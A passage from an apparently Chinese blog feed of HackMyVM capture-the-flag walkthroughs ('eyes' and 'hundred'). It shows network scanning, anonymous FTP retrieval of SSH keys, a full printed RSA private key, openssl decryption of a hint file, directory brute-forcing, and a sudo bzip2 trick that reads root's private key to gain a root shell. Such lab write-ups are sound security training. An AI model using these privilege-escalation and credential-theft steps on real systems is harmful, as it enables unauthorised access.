-----END OPENSSH PRIVATE KEY-----</code></pre>
<p>那就妥了，那个shell先</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">monica@eyes:/opt$ <span class="token builtin class-name">cd</span> /tmp
monica@eyes:/tmp$ <span class="token function">sudo</span> <span class="token function">bzip2</span> <span class="token parameter variable">-c</span> <span class="token variable">$LFILE</span> <span class="token operator">|</span> <span class="token function">bzip2</span> <span class="token parameter variable">-d</span> <span class="token operator">></span> aaa
monica@eyes:/tmp$ <span class="token function">chmod</span> <span class="token number">600</span> aaa             
monica@eyes:/tmp$ <span class="token function">ssh</span> <span class="token parameter variable">-i</span> aaa root@127.0.0.1
The authenticity of <span class="token function">host</span> <span class="token string">'127.0.0.1 (127.0.0.1)'</span> can<span class="token string">'t be established.
ECDSA key fingerprint is SHA256:TipbuRdJVZpWa4cZg3EXeYD+0c/HkByHVJ49iJ3ytLE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '</span><span class="token number">127.0</span>.0.1' <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span> to the list of known hosts.
Linux eyes <span class="token number">4.19</span>.0-14-amd64 <span class="token comment">#1 SMP Debian 4.19.171-2 (2021-01-30) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr  <span class="token number">4</span> <span class="token number">13</span>:24:38 <span class="token number">2021</span>
root@eyes:~<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<p>结束。</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>filter链</tag>
        <tag>puts溢出</tag>
        <tag>bzip2提权</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-hundred</title>
    <url>/posts/f5427d41/</url>
    <content><![CDATA[<p><strong>难度:hard</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.190</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:20:20:a8       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.190  08:00:27:89:4b:7a       PCS Systemtechnik GmbH

<span class="token number">183</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">2.087</span> seconds <span class="token punctuation">(</span><span class="token number">122.66</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>

<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.56.190
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-23 <span class="token number">20</span>:15 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.190
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0013s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">997</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http
MAC Address: 08:00:27:89:4B:7A <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.24</span> seconds</code></pre>
<h2 id="ftp-匿名登录"><a href="#ftp-匿名登录" class="headerlink" title="ftp 匿名登录"></a>ftp 匿名登录</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">ftp</span> <span class="token number">192.168</span>.56.190
Connected to <span class="token number">192.168</span>.56.190.
<span class="token number">220</span> <span class="token punctuation">(</span>vsFTPd <span class="token number">3.0</span>.3<span class="token punctuation">)</span>
Name <span class="token punctuation">(</span><span class="token number">192.168</span>.56.190:root<span class="token punctuation">)</span>: anonymous
<span class="token number">331</span> Please specify the password.
Password: 
<span class="token number">230</span> Login successful.
Remote system <span class="token builtin class-name">type</span> is UNIX.
Using binary mode to transfer files.
ftp<span class="token operator">></span> <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">33725</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Here comes the directory listing.
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">113</span>          <span class="token number">4096</span> Aug 02  <span class="token number">2021</span> <span class="token builtin class-name">.</span>
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">113</span>          <span class="token number">4096</span> Aug 02  <span class="token number">2021</span> <span class="token punctuation">..</span>
<span class="token parameter variable">-rwxrwxrwx</span>    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>             <span class="token number">435</span> Aug 02  <span class="token number">2021</span> id_rsa
<span class="token parameter variable">-rwxrwxrwx</span>    <span class="token number">1</span> <span class="token number">1000</span>     <span class="token number">1000</span>         <span class="token number">1679</span> Aug 02  <span class="token number">2021</span> id_rsa.pem
<span class="token parameter variable">-rwxrwxrwx</span>    <span class="token number">1</span> <span class="token number">1000</span>     <span class="token number">1000</span>          <span class="token number">451</span> Aug 02  <span class="token number">2021</span> id_rsa.pub
<span class="token parameter variable">-rwxrwxrwx</span>    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>             <span class="token number">187</span> Aug 02  <span class="token number">2021</span> users.txt
<span class="token number">226</span> Directory send OK.
ftp<span class="token operator">></span> get users.txt
local: users.txt remote: users.txt
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">11865</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> users.txt <span class="token punctuation">(</span><span class="token number">187</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>***********************************************************************************************************************************************************************************************<span class="token operator">|</span>   <span class="token number">187</span>       <span class="token number">84.66</span> KiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">187</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">71.44</span> KiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> get id_rsa
local: id_rsa remote: id_rsa
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">34327</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> id_rsa <span class="token punctuation">(</span><span class="token number">435</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>***********************************************************************************************************************************************************************************************<span class="token operator">|</span>   <span class="token number">435</span>      <span class="token number">223.22</span> KiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">435</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">93.32</span> KiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> get id_rsa.pem
local: id_rsa.pem remote: id_rsa.pem
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">43759</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> id_rsa.pem <span class="token punctuation">(</span><span class="token number">1679</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>***********************************************************************************************************************************************************************************************<span class="token operator">|</span>  <span class="token number">1679</span>      <span class="token number">827.26</span> KiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">1679</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">652.46</span> KiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> get id_rsa.pub
local: id_rsa.pub remote: id_rsa.pub
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">58673</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> id_rsa.pub <span class="token punctuation">(</span><span class="token number">451</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>***********************************************************************************************************************************************************************************************<span class="token operator">|</span>   <span class="token number">451</span>        <span class="token number">1.30</span> MiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">451</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">101.01</span> KiB/s<span class="token punctuation">)</span>
ftp<span class="token operator">></span> <span class="token builtin class-name">exit</span>
<span class="token number">221</span> Goodbye.</code></pre>
<p>看到几个文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> users.txt                                                                                              
--- SNIP ---
noname
roelvb
ch4rm
marcioapm
isen
sys7em
chicko
tasiyanci
luken
alienum
linked
tatayoyo
0xr0n1n
exploiter
kanek180
cromiphi
softyhack
b4el7d
val1d
--- SNIP ---

Thanks<span class="token operator">!</span>
hmv</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> id_rsa    
  / <span class="token punctuation">\</span>
    / _ <span class="token punctuation">\</span>
   <span class="token operator">|</span> / <span class="token punctuation">\</span> <span class="token operator">|</span>
   <span class="token operator">||</span>   <span class="token operator">||</span> _______
   <span class="token operator">||</span>   <span class="token operator">||</span> <span class="token operator">|</span><span class="token punctuation">\</span>     <span class="token punctuation">\</span>
   <span class="token operator">||</span>   <span class="token operator">||</span> <span class="token operator">||</span><span class="token punctuation">\</span>     <span class="token punctuation">\</span>
   <span class="token operator">||</span>   <span class="token operator">||</span> <span class="token operator">||</span> <span class="token punctuation">\</span>    <span class="token operator">|</span>
   <span class="token operator">||</span>   <span class="token operator">||</span> <span class="token operator">||</span>  <span class="token punctuation">\</span>__/
   <span class="token operator">||</span>   <span class="token operator">||</span> <span class="token operator">||</span>   <span class="token operator">||</span>
    <span class="token punctuation">\</span><span class="token punctuation">\</span>_/ <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span>_//
   /   _     _   <span class="token punctuation">\</span>
  /               <span class="token punctuation">\</span>
  <span class="token operator">|</span>    O     O    <span class="token operator">|</span>
  <span class="token operator">|</span>   <span class="token punctuation">\</span>  ___  /   <span class="token operator">|</span>                           
 /     <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ /     <span class="token punctuation">\</span>
/  -----  <span class="token operator">|</span>  --<span class="token punctuation">\</span>    <span class="token punctuation">\</span>
<span class="token operator">|</span>     <span class="token punctuation">\</span>__/<span class="token operator">|</span><span class="token punctuation">\</span>__/ <span class="token punctuation">\</span>   <span class="token operator">|</span>
<span class="token punctuation">\</span>       <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>       /
 <span class="token punctuation">\</span>_____       _____/
       <span class="token punctuation">\</span>     /
       <span class="token operator">|</span>     <span class="token operator">|</span>
-------------------------</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> id_rsa.pub
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwsrHORyA+mG6HS9ZmZwz
PmKHrHhA0/kKCwNjUG8rmPVupv73mUsewpoGvYB9L9I7pUAsMscAb5MVo89d4b0z
2RnXDD1fh6mKlTJmcNwWCnA1PgD+OwqewshpkCBhCV6O2P6dktfA8UI/uqF6uT4Q
ISU4ksriN16cOm/89jHadetB8dCeh3Rx6HrFNccY8aiDRSA9meqz7YGE2+lJ/Ntw
tndUkzzxKxuKC6z4gG780tZHhg83xVwZ9bxPyHfGqHWmV4yGsAgp7mot7pg9Vzff
nP6DAVnbReDDbhNLcnfVXEkBv8SQL7OFIiKxJpoa1ADqGffA5LOPFdYKbbCFMict
QQIDAQAB
-----END PUBLIC KEY-----</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> id_rsa.pem 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwsrHORyA+mG6HS9ZmZwzPmKHrHhA0/kKCwNjUG8rmPVupv73
mUsewpoGvYB9L9I7pUAsMscAb5MVo89d4b0z2RnXDD1fh6mKlTJmcNwWCnA1PgD+
OwqewshpkCBhCV6O2P6dktfA8UI/uqF6uT4QISU4ksriN16cOm/89jHadetB8dCe
h3Rx6HrFNccY8aiDRSA9meqz7YGE2+lJ/NtwtndUkzzxKxuKC6z4gG780tZHhg83
xVwZ9bxPyHfGqHWmV4yGsAgp7mot7pg9VzffnP6DAVnbReDDbhNLcnfVXEkBv8SQ
L7OFIiKxJpoa1ADqGffA5LOPFdYKbbCFMictQQIDAQABAoIBAE4Q6IDp/ILcEbPK
mzUl1Z+l60visdCCGVVKmU3OEAHwMtV4j5B++6fwBM2Dpig5MDBNJKmA+Zq9rsmE
vNJQemwCoB3Gpvd+qgybM1T9z1OFnsDnsvvEiNX1beEWKO2RWNx8RnhoQWovK81H
FCETT3GJMkAaUUjxgNkmspGUb0IcP4YR61jpNy8thMLz8FQV8XqNSf4DSd9+8wrm
FBFDFzso6zcBtsY6/nDueaVfLsequU1Fdhh3itC6rPXync/EWN0HJtaiKEVAytYE
cvl1hVpRVhGZGjPqNQSPcknO0K2b22anRoiSpBoCzaopbSZHySFgcZM8oxGgw35j
YpS1ULUCgYEA+1Se5s4AzsOX/3RRwwF9Was//oHU1N2JnJRetF9tjeFu8MEMnSec
a3bcPy+CZHB8oVnoyh647IObzPUjCgMxdyTLdfGmQ8RgzXhwYeQRe+ethrT/Ra26
7m+R+3838k5ZTKnwjBPreV/i2AmwZYDPT2S5q5b7m5Cr4QTfsaScaKsCgYEAxmk/
xzu2XO8YmE+8R62nWdLPMaj4E5IPkT3uCA8G24KGSSyK29OGZ02RI8qxWkdqMxKJ
rTDrQJ/4oU6108Vhay0tyFswbNn0ymlHAhPKxXNr0xHkC6rCnDEnn6W7bspTxxyk
9OUtl2UemtnEKRm3qu9Rc1qLFW0/Zhxw3ovgWcMCgYEAka6HPPoD9dXicSyXiBWA
900QlxHisFCJx70o+ByogClACUWdbirbvF71Y5rCVj3twAlBqocMYewXj0I4wUEA
lzM4zHD6EyXthqxdWCC/EbdFGmQn49fEFxmM4N7pKwbHNGz9BfU19PDjqJ5VJUD4
6ehUx2WJCq9dMd2FXI8yKmkCgYAMBBnBtiMQM8a4irOrX5/v961mo4YKoWDh+e8t
e8N9jcUWL2VldMUCApeUpFTjU8nht/CwlXLZ4hZLppmqbpy8weqw5JzlKroBfCi5
vnscRCY2jTHTZw8MKInuyDm2tvgl6d0vm6WMMqqM1D1mA9G0v3OeWdBshsY9J+HK
CIyYwwKBgQDEXoZ+lZKyPUBSgcE+b52U2Dj9GAPKPUDZpsCbUebftZknOk/HelF1
wiWWDjni1ILVSfWIR4/nvosJPa+39WDv+dFt3bJdcUA3SL2acW3MGVPC6abZWwSo
izXrZm8h0ZSuXyU/uuT3BCJt77HyN2cPZrqccPwanS9du6zrX0u2yQ<span class="token operator">==</span>
-----END RSA PRIVATE KEY-----</code></pre>
<h2 id="web信息搜集"><a href="#web信息搜集" class="headerlink" title="web信息搜集"></a>web信息搜集</h2><p><img src="https://ooo.0x0.ooo/2024/06/23/OPz9Os.png" alt="OPz9Os.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/23/OPzjNK.png" alt="OPzjNK.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">key:h4ckb1tu5.enc
<span class="token operator">&lt;</span><span class="token operator">!</span>-- l4nr3n, <span class="token function">nice</span> dir.--<span class="token operator">></span></code></pre>
<p>也不知道这是个什么东西，难道说有个路径叫<code>l4nr3n</code>?还给了一个key<br>访问一下这个路径<br><img src="https://ooo.0x0.ooo/2024/06/23/OPz2Ea.png" alt="OPz2Ea.png" loading="lazy"><br>嘻嘻404<br>访问一下<code>h4ckb1tu5.enc</code><br><img src="https://ooo.0x0.ooo/2024/06/23/OPz6uS.png" alt="OPz6uS.png" loading="lazy"><br>下载了一个密文文件,先放着，不知道如何解密</p>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.56.190 <span class="token parameter variable">-x</span> html,txt,php,bak,zip <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.190
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              html,txt,php,bak,zip
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">242</span><span class="token punctuation">]</span>
Progress: <span class="token number">1323360</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<h2 id="enc解密"><a href="#enc解密" class="headerlink" title="enc解密"></a>enc解密</h2><p>那目录这条路没法走了，只能从上面拿到的密文下手，想到之前看到密码大神Lazzaro的博客翻开了一手发现果然有工具可以解<code>openssl</code><br><img src="https://ooo.0x0.ooo/2024/06/23/OPzXFN.png" alt="OPzXFN.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> openssl rsautl <span class="token parameter variable">-decrypt</span> <span class="token parameter variable">-inkey</span> id_rsa.pem <span class="token parameter variable">-in</span> h4ckb1tu5.enc <span class="token parameter variable">-out</span> aa.txt
The <span class="token builtin class-name">command</span> rsautl was deprecated <span class="token keyword">in</span> version <span class="token number">3.0</span>. Use <span class="token string">'pkeyutl'</span> instead.

 ~/Desktop                                                                                                                                                                                                            root@kali2  <span class="token number">20</span>:27:42 
<span class="token operator">></span> openssl pkeyutl <span class="token parameter variable">-decrypt</span> <span class="token parameter variable">-inkey</span> id_rsa.pem <span class="token parameter variable">-in</span> h4ckb1tu5.enc <span class="token parameter variable">-out</span> aa.txt

 ~/Desktop                                                                                                                                                                                                            root@kali2  <span class="token number">20</span>:28:02 
<span class="token operator">></span> <span class="token function">cat</span> aa.txt                                                                  
/softyhackb4el7dshelldredd</code></pre>
<p>拿到一个目录，去看一下<br><img src="https://ooo.0x0.ooo/2024/06/23/OPzuPC.png" alt="OPzuPC.png" loading="lazy"><br>三个点意思是再扫目录呗</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.56.190/softyhackb4el7dshelldredd/ <span class="token parameter variable">-x</span> html,txt,php,bak,zip <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.190/softyhackb4el7dshelldredd/
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              txt,php,bak,zip,html
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
